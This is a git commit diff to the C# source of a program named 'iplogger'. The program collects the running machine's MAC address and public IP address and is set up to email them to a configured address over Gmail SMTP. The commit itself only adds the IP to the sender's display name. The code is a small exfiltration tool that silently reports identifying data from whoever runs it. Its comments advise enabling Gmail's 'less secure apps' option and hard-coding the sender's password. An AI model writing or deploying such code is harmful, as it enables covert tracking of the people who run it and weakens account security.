a6923d2423d389e39c4494f5fbbe6664768ae5e9
NullByte75 <66488397+NullByte75@users.noreply.github.com>
2020-07-16 10:14:45 +0200

    Update Program.cs

--- Program.cs
+++ Program.cs
@@ -20,7 +20,7 @@ namespace iplogger
                 string publicip = new WebClient().DownloadString("http://icanhazip.com"); //gets the public ip and writes it into a string
                 Console.WriteLine(mac);
                 Console.WriteLine(publicip);
-                var fromAddress = new MailAddress("from@gmail.com", "From Logger"); //change from@gmail.com to the sender email (create an email and set lesssecureapps on)
+                var fromAddress = new MailAddress("from@gmail.com", $"From Logger: {publicip}"); //change from@gmail.com to the sender email (create an email and set lesssecureapps on)
                 var toAddress = new MailAddress("to@gmail.com", "To You"); //change to@example.com to the reciever email (set lesssecureapps on)
                 var fromPassword = "thepasswordofthesender"; //change senderpassword to the password of the sender
                 var smtp = new SmtpClient
